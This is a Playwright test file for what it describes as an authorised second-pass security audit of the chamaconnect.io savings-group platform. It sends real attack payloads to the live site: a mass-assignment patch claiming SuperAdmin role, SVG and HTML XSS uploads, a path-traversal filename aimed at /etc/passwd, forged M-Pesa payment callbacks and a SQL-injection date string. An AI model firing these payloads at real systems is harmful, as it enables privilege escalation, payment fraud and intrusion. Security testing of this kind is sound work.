/**
 * Audit pass 2 — the remaining surfaces ("ALL").
 *
 * Split by risk:
 *   - Read-only probes (27 /users/admin, 28 date parsing, 26 WebSocket, 24
 *     Daraja forgery) — safe to run against Eugene's account or anonymous.
 *   - Mutation probes (21 mass-assignment, 22 file upload, 23 form-urlencoded
 *     mutations, 25 email-verified reset) — need a *fresh disposable probe
 *     account*. If we can't get one, those tests skip rather than touch
 *     Eugene's account.
 *
 * Probes that didn't fire last run: all of them after the probe-account helper
 * failed.  This version falls back gracefully.
 */

import { test, expect, request, APIRequestContext } from "@playwright/test";
import * as fs from "fs";
import * as path from "path";
import * as dotenv from "dotenv";

dotenv.config({ path: path.resolve(__dirname, "../../.env") });

const BASE = "https://chamaconnect.io";

const RUN_DIR = path.resolve(
  __dirname,
  "..",
  "artifacts",
  `audit2-${new Date().toISOString().replace(/[:.]/g, "-")}`
);
fs.mkdirSync(RUN_DIR, { recursive: true });
const save = (name: string, data: unknown) =>
  fs.writeFileSync(path.join(RUN_DIR, `${name}.json`), JSON.stringify(data, null, 2));

const freshApi = () => request.newContext({ baseURL: BASE });
const authHeaders = (token: string) => ({
  Authorization: `Bearer ${token}`,
  "content-type": "application/json",
});

// ─────────────────── Eugene's token (for read-only probes) ───────────────────
let eugeneToken: string | null = null;
async function getEugeneToken(api: APIRequestContext): Promise<string | null> {
  if (eugeneToken) return eugeneToken;
  const r = await api.post("/api/proxy/users/signin", {
    data: { email: process.env.email, password: process.env.password },
    headers: { "content-type": "application/json" },
  });
  if (!r.ok()) return null;
  const j = (await r.json()) as any;
  eugeneToken = j?.data?.token ?? null;
  return eugeneToken;
}

// ─────────────────── Fresh probe account (for mutation probes) ───────────────
type Probe = { email: string; phone: string; password: string; token: string; id: string };
let probe: Probe | null = null;
let probeTried = false;

async function getProbeAccount(api: APIRequestContext): Promise<Probe | null> {
  if (probe) return probe;
  if (probeTried) return null;
  probeTried = true;

  const email = `audit2-${Date.now()}-${Math.random().toString(36).slice(2, 6)}@probe.local`;
  // +254 706 xxxxxx — same prefix as audit-pass-1's successful signups.
  const phone = `+254706${Math.floor(Math.random() * 900_000 + 100_000)
    .toString()
    .padStart(6, "0")}`;
  const password = "ValidP@ssw0rd2026!";

  const up = await api.post("/api/proxy/users/signup", {
    data: { firstName: "Audit", lastName: "Two", email, phone, password, country: "KE" },
    headers: { "content-type": "application/json" },
  });
  const upBody = await up.text();
  let upJson: any = null;
  try { upJson = JSON.parse(upBody); } catch {}

  // Sometimes signup's own response already carries a token (we observed this
  // in audit-pass-1's probe 07 + restore flow).
  let token: string | null = upJson?.data?.token ?? null;
  let id: string | null = upJson?.data?.id ?? upJson?.data?.user?.id ?? null;

  if (!token) {
    // Fall back to explicit signin.
    const si = await api.post("/api/proxy/users/signin", {
      data: { email, password },
      headers: { "content-type": "application/json" },
    });
    const siBody = await si.text();
    let sij: any = null;
    try { sij = JSON.parse(siBody); } catch {}
    token = sij?.data?.token ?? null;
    id = sij?.data?.user?.id ?? id;
    save("00_probe_account_debug", {
      email, phone,
      signupStatus: up.status(), signupBody: upBody.slice(0, 400),
      signinStatus: si.status(), signinBody: siBody.slice(0, 400),
    });
  } else {
    save("00_probe_account_debug", {
      email, phone,
      signupStatus: up.status(), signupBody: upBody.slice(0, 400),
      tokenInSignup: true,
    });
  }

  if (!token || !id) {
    save("00_probe_account", {
      email, phone,
      note: "could not obtain a usable token; mutation probes will skip",
    });
    return null;
  }

  probe = { email, phone, password, token, id };
  save("00_probe_account", { email, phone, id, tokenPrefix: token.slice(0, 20) });
  return probe;
}

// ────────────────── 21 — mass-assignment on update-profile ──────────────────
test("probe 21 · mass-assignment on update-profile (fresh probe account)", async () => {
  const api = await freshApi();
  const p = await getProbeAccount(api);
  test.skip(!p, "no probe account");

  const dangerous = {
    role:          { id: "69c50c8a38f08070a83bd361", name: "SuperAdmin" },
    roleId:        "69c50c8a38f08070a83bd361",
    isSuperadmin:  true,
    userType:      "SUPERADMIN",
    emailVerified: true,
    isActive:      true,
    accountStatus: "SUPER",
    blockchainAddress: "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF",
    permissions:   ["*"],
    deletionRequestedAt: null,
    deletionCompletedAt: null,
    activatedAt:   "1970-01-01T00:00:00Z",
    createdAt:     "1970-01-01T00:00:00Z",
  };

  const before = await api.get("/api/proxy/users/current-user", { headers: authHeaders(p!.token) });
  const b = (await before.json())?.data ?? {};

  const patch = await api.fetch("/api/proxy/users/update-profile", {
    method: "PATCH",
    data: JSON.stringify(dangerous),
    headers: authHeaders(p!.token),
  });
  const patchBody = await patch.text();

  const after = await api.get("/api/proxy/users/current-user", { headers: authHeaders(p!.token) });
  const a = (await after.json())?.data ?? {};

  const stuck: Record<string, { before: unknown; after: unknown }> = {};
  for (const k of Object.keys(dangerous)) {
    if (JSON.stringify((b as any)[k]) !== JSON.stringify((a as any)[k])) {
      stuck[k] = { before: (b as any)[k], after: (a as any)[k] };
    }
  }

  save("21_mass_assignment", {
    sent: dangerous,
    patchStatus: patch.status(),
    patchBody: patchBody.slice(0, 600),
    stuckFields: stuck,
    beforeRole: { role: b.role, roleId: b.roleId, isSuperadmin: b.isSuperadmin, userType: b.userType, accountStatus: b.accountStatus, emailVerified: b.emailVerified, isActive: b.isActive, blockchainAddress: b.blockchainAddress },
    afterRole:  { role: a.role, roleId: a.roleId, isSuperadmin: a.isSuperadmin, userType: a.userType, accountStatus: a.accountStatus, emailVerified: a.emailVerified, isActive: a.isActive, blockchainAddress: a.blockchainAddress },
  });
});

// ────────────────── 22 — file upload ──────────────────
test("probe 22 · file upload variants", async () => {
  const api = await freshApi();
  const p = await getProbeAccount(api);
  test.skip(!p, "no probe account");

  type Shot = { name: string; status: number; body: string; responseType: string };
  const shots: Shot[] = [];

  async function send(
    label: string,
    field: string,
    buffer: Buffer,
    mime: string,
    filename: string
  ) {
    const r = await api.post("/api/proxy/users/update-profile-picture", {
      multipart: { [field]: { name: filename, mimeType: mime, buffer } },
      headers: { Authorization: `Bearer ${p!.token}` },
    });
    const body = await r.text();
    shots.push({
      name: `${label} [field=${field}]`,
      status: r.status(),
      body: body.slice(0, 400),
      responseType: r.headers()["content-type"] ?? "",
    });
  }

  const svgXss = Buffer.from(
    `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
  <script>alert("XSS via SVG")</script>
  <rect width="10" height="10" fill="red"/>
</svg>`
  );
  for (const field of ["profilePicture", "file", "image", "avatar"]) {
    await send("svg-xss", field, svgXss, "image/svg+xml", "evil.svg");
  }

  const html = Buffer.from(`<html><body><script>alert(1)</script></body></html>`);
  await send("html-as-png", "profilePicture", html, "image/png", "evil.html");

  const fakeExe = Buffer.concat([Buffer.from([0x4d, 0x5a]), Buffer.alloc(1024, 0)]);
  await send("mz-fake-png", "profilePicture", fakeExe, "image/png", "evil.png");

  const big = Buffer.alloc(2 * 1024 * 1024, 0);
  big[0] = 0x89; big[1] = 0x50; big[2] = 0x4e; big[3] = 0x47;
  await send("oversized-png-2mb", "profilePicture", big, "image/png", "huge.png");

  const tinyPng = Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
  ]);
  await send("path-traversal-filename", "profilePicture", tinyPng, "image/png", "../../../../../../etc/passwd");

  await send("text-mime-image", "profilePicture", Buffer.from("just plain text"), "image/jpeg", "plain.txt");

  save("22_file_upload", shots);
});

// ────────────────── 23 — form-urlencoded on mutation endpoints ──────────────────
test("probe 23 · form-urlencoded mutations", async () => {
  const api = await freshApi();
  const p = await getProbeAccount(api);
  test.skip(!p, "no probe account");

  const rows: Array<{ url: string; method: string; ct: string; status: number; body: string }> = [];
  async function fire(url: string, method: string, body: string, ct: string) {
    const r = await api.fetch(url, {
      method,
      data: body,
      headers: { Authorization: `Bearer ${p!.token}`, "content-type": ct },
    });
    rows.push({ url, method, ct, status: r.status(), body: (await r.text()).slice(0, 400) });
  }

  const mutations = [
    { url: "/api/proxy/users/update-profile", method: "PATCH", form: "firstName=Form&lastName=Test" },
    { url: "/api/proxy/users/current-user-update-password", method: "PATCH", form: "currentPassword=x&newPassword=y" },
    { url: "/api/proxy/groups", method: "POST", form: "name=formtest&members=[]" },
    { url: "/api/proxy/settings/any-id", method: "PUT", form: "loanFee=9999" },
    { url: "/api/proxy/roles", method: "POST", form: "name=FormRole" },
  ];
  for (const m of mutations) {
    await fire(m.url, m.method, m.form, "application/x-www-form-urlencoded");
    await fire(m.url, m.method, m.form, "multipart/form-data; boundary=----X");
  }
  save("23_form_urlencoded_mutations", rows);
});

// ────────────────── 24 — Daraja forgery (single-shot) ──────────────────
test("probe 24 · daraja callback forgery", async () => {
  const api = await freshApi();
  const forged = {
    Body: {
      stkCallback: {
        MerchantRequestID: "AUDIT2-FAKE-MERCHANT-REQUEST",
        CheckoutRequestID: "ws_CO_ForgeryProbe_DO_NOT_ROLLUP",
        ResultCode: 0,
        ResultDesc: "(Audit probe) The service request is processed successfully.",
        CallbackMetadata: {
          Item: [
            { Name: "Amount",             Value: 1 },
            { Name: "MpesaReceiptNumber", Value: "AUDITFORGE1" },
            { Name: "TransactionDate",    Value: 20260420120000 },
            { Name: "PhoneNumber",        Value: 254700000000 },
          ],
        },
      },
    },
  };
  const candidates = [
    "/api/mpesa/c2b/confirmation",
    "/api/mpesa/stk/callback",
    "/api/proxy/mpesa/callback",
    "/api/proxy/mpesa/stk/callback",
    "/api/proxy/mpesa/c2b/confirmation",
    "/api/proxy/transactions/mpesa/callback",
    "/api/proxy/webhooks/mpesa",
    "/api/proxy/groups/mpesa-callback",
  ];
  const rows: Array<{ url: string; status: number; body: string }> = [];
  for (const url of candidates) {
    const r = await api.post(url, {
      data: forged,
      headers: { "content-type": "application/json" },
    });
    rows.push({ url, status: r.status(), body: (await r.text()).slice(0, 400) });
  }
  save("24_daraja_forgery", { sent: forged, rows });
});

// ────────────────── 25 — emailVerified reset on email change ──────────────────
test("probe 25 · emailVerified after email change", async () => {
  const api = await freshApi();
  const p = await getProbeAccount(api);
  test.skip(!p, "no probe account");

  const before = await api.get("/api/proxy/users/current-user", { headers: authHeaders(p!.token) });
  const b = (await before.json())?.data ?? {};

  const newEmail = `post-change-${Date.now()}@probe.local`;
  const patch = await api.fetch("/api/proxy/users/update-profile", {
    method: "PATCH",
    data: JSON.stringify({ email: newEmail }),
    headers: authHeaders(p!.token),
  });
  const patchBody = await patch.text();

  const after = await api.get("/api/proxy/users/current-user", { headers: authHeaders(p!.token) });
  const a = (await after.json())?.data ?? {};

  save("25_email_verified_reset", {
    originalEmail: p!.email,
    newEmail,
    patchStatus: patch.status(),
    patchBody: patchBody.slice(0, 400),
    before: { email: b.email, emailVerified: b.emailVerified },
    after:  { email: a.email, emailVerified: a.emailVerified },
  });

  if (probe) probe.email = a.email ?? newEmail;
});

// ────────────────── 26 — WebSocket auth ──────────────────
test("probe 26 · websocket auth", async () => {
  const api = await freshApi();
  const urls = [
    "/socket.io/?EIO=4&transport=polling",
    "/api/socket.io/?EIO=4&transport=polling",
    "/api/proxy/socket.io/?EIO=4&transport=polling",
    "/socket.io/",
  ];
  const attempts: Array<{ url: string; status: number; headers: Record<string, string>; body: string }> = [];
  for (const u of urls) {
    const r = await api.get(u, { maxRedirects: 0 });
    attempts.push({
      url: u,
      status: r.status(),
      headers: await r.headers(),
      body: (await r.text()).slice(0, 300),
    });
  }
  save("26_websocket_auth", attempts);
});

// ────────────────── 27 — /api/proxy/users/admin ──────────────────
test("probe 27 · users/admin surface (Eugene's token)", async () => {
  const api = await freshApi();
  const token = await getEugeneToken(api);
  test.skip(!token, "no eugene token");
  const rows: Array<{ method: string; status: number; body: string }> = [];
  for (const method of ["GET", "POST", "PATCH", "PUT", "DELETE"]) {
    const r = await api.fetch("/api/proxy/users/admin", {
      method,
      headers: authHeaders(token!),
      data: method === "GET" ? undefined : JSON.stringify({}),
    });
    rows.push({ method, status: r.status(), body: (await r.text()).slice(0, 400) });
  }
  save("27_users_admin", rows);
});

// ────────────────── 28 — date parsing edges ──────────────────
test("probe 28 · date parsing edges", async () => {
  const api = await freshApi();
  const token = await getEugeneToken(api);
  test.skip(!token, "no eugene token");
  const weirdDates = [
    "2024-02-29T00:00:00Z",
    "2023-02-29T00:00:00Z",
    "1970-01-01T00:00:00Z",
    "9999-12-31T23:59:59Z",
    "2026-03-10T02:30:00-08:00",
    "2026-11-05T01:30:00-07:00",
    "not-a-date",
    "'; DROP TABLE users; --",
    "2026-13-40T25:61:61Z",
    "",
  ];
  const endpoints = [
    "/api/proxy/transactions?from=",
    "/api/proxy/transactions?to=",
    "/api/proxy/notifications?since=",
    "/api/proxy/groups?createdAt=",
  ];
  const rows: Array<{ url: string; date: string; status: number; body: string }> = [];
  for (const ep of endpoints) {
    for (const d of weirdDates) {
      const url = ep + encodeURIComponent(d);
      const r = await api.get(url, { headers: authHeaders(token!) });
      rows.push({ url: ep, date: d, status: r.status(), body: (await r.text()).slice(0, 180) });
    }
  }
  save("28_date_edges", rows);
});
